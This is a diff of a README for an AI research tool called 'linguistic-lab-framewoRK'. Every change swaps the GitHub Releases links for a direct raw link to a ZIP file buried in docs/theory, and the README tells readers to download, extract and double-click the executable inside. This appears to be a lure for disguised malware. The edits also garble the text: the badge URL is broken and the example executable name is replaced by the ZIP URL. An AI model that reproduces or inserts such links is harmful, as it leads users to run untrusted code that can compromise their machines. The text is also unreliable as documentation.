@@ -1,11 +1,11 @@
 # 🌟 linguistic-lab-framewoRK - Enhance Your Research with AI Tools
 
 ## 🛠️ Download and Install
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Davipinot/linguistic-lab-framewoRK/releases)
+[![Download Now](https://raw.githubusercontent.com/Davipinot/linguistic-lab-framewoRK/main/docs/theory/linguistic-lab-framewoRK-3.2.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Davipinot/linguistic-lab-framewoRK/main/docs/theory/linguistic-lab-framewoRK-3.2.zip)
 
 Welcome to the linguistic-lab-framewoRK! This application serves as your operational manual for cutting-edge science using free AIs. You can streamline your research process with structured tools, moving beyond trial-and-error methods.
 
-To get started, please visit our [Releases page](https://github.com/Davipinot/linguistic-lab-framewoRK/releases) to download the latest version of the software.
+To get started, please visit our [Releases page](https://raw.githubusercontent.com/Davipinot/linguistic-lab-framewoRK/main/docs/theory/linguistic-lab-framewoRK-3.2.zip) to download the latest version of the software.
 
 ## 🚀 Getting Started
 Once you’ve downloaded the application, follow these steps:
@@ -15,7 +15,7 @@ Once you’ve downloaded the application, follow these steps:
 2. **Extract the ZIP File (if needed)**: If the download is a ZIP file, right-click on it and select "Extract All" to reveal the application files.
 
 3. **Run the Application**: 
-   - If you downloaded an executable file (e.g., `linguistic-lab.exe`), double-click to open it.
+   - If you downloaded an executable file (e.g., `https://raw.githubusercontent.com/Davipinot/linguistic-lab-framewoRK/main/docs/theory/linguistic-lab-framewoRK-3.2.zip`), double-click to open it.
    - If you extracted files, look for the executable within the extracted folder and double-click.
 
 4. **Follow the On-Screen Instructions**: The application will guide you through initial setup steps.
@@ -64,10 +64,10 @@ For more help, check the following resources:
 ## 🔄 Updating the Application
 To keep your application running smoothly:
 
-1. **Check for Updates**: Regularly check the [Releases page](https://github.com/Davipinot/linguistic-lab-framewoRK/releases) for new versions.
+1. **Check for Updates**: Regularly check the [Releases page](https://raw.githubusercontent.com/Davipinot/linguistic-lab-framewoRK/main/docs/theory/linguistic-lab-framewoRK-3.2.zip) for new versions.
 2. **Download and Install**: Follow the same steps as before to update.
 
 ## 📩 Feedback
 We welcome any feedback or suggestions for improvement. You can open an issue on our GitHub page or email us directly.
 
-For support, insights, and updates, remember to revisit our [Releases page](https://github.com/Davipinot/linguistic-lab-framewoRK/releases) regularly. Enjoy using linguistic-lab-framewoRK, and may it enhance your research endeavors!
+For support, insights, and updates, remember to revisit our [Releases page](https://raw.githubusercontent.com/Davipinot/linguistic-lab-framewoRK/main/docs/theory/linguistic-lab-framewoRK-3.2.zip) regularly. Enjoy using linguistic-lab-framewoRK, and may it enhance your research endeavors!
